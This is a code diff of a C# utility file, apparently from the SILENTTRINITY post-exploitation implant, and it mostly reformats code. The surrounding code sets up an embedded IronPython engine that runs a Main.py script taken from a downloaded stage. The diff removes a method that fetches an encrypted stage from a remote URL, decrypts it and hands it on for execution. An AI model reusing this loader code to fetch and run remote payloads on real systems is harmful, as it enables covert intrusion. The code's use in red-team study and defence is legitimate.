@@ -2,12 +2,12 @@
 using System.Reflection;
 using IronPython.Hosting;
 using IronPython.Modules;
-using Microsoft.Scripting.Hosting;
 using System.Linq;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.IO.Compression;
+using Microsoft.Scripting.Hosting;
 
 namespace SILENTTRINITY.Utilities
 {
@@ -28,20 +28,18 @@ namespace SILENTTRINITY.Utilities
 
                     scope.SetVariable("URL", url);
                     scope.SetVariable("GUID", GUID);
-                    scope.SetVariable("IronPythonDLL", Assembly.Load(Internals.GetResourceInZip(Stage, "IronPython.dll")));
+                    scope.SetVariable("IronPythonDLL",
+                        Assembly.Load(Internals.GetResourceInZip(Stage, 
+                                      "IronPython.dll"))
+                        );
 #if DEBUG
                     scope.SetVariable("DEBUG", true);
 #elif RELEASE
                     scope.SetVariable("DEBUG", false);
 #endif
                     byte[] mainPyFile = Internals.GetResourceInZip(Stage, "Main.py");
-                    engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
+                     engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);
                 }
-            }
-
-            public static MemoryStream GetStage(Uri uri)
-            {
-                return new MemoryStream(Crypto.Decrypt(Crypto.KeyExchange(uri), Http.Get(uri)));
             }
 
             // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
@@ -49,43 +47,40 @@ namespace SILENTTRINITY.Utilities
             // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
             public static dynamic CreateEngine()
             {
-                var options = new Dictionary<string, object>
-                {
-                    ["Debug"] = false
-                };
-
-                ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(options);
+                ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(
+                                                new Dictionary<string, object>
+                                                    {
+                                                        ["Debug"] = false
+                                                    });
                 var pyRuntime = new ScriptRuntime(setup);
                 ScriptEngine engineInstance = Python.GetEngine(pyRuntime);
-
                 AddPythonLibrariesToSysMetaPath(engineInstance);
-
                 return engineInstance;
             }
 
             public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
             {
                 Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;
+
                 try
                 {
-                    var resQuery =
-                        from name in asm.GetManifestResourceNames()
+                    var resQuery = from name in asm.GetManifestResourceNames()
                         where name.EndsWith(".zip", StringComparison.OrdinalIgnoreCase)
-                        select name;
+                            select name;
                     string resName = resQuery.Single();
-
 #if DEBUG
-                    Console.WriteLine("Found embedded IPY stdlib : {0}", resName);
+                    Console.WriteLine("\t[+] Found embedded IPY stdlib: {0}", resName);
 #endif
                     var importer = new ResourceMetaPathImporter(asm, resName);
                     dynamic sys = engineInstance.GetSysModule();
+
                     sys.meta_path.append(importer);
                     sys.path.append(importer);
                 }
                 catch (Exception e)
                 {
 #if DEBUG
-                    Console.WriteLine("Did not find IPY stdlib in embedded resources: {0}", e.Message);
+                    Console.WriteLine("\t[-] Did not find IPY stdlib in embedded resources: {0}", e.Message);
 #endif
                     return;
                 }
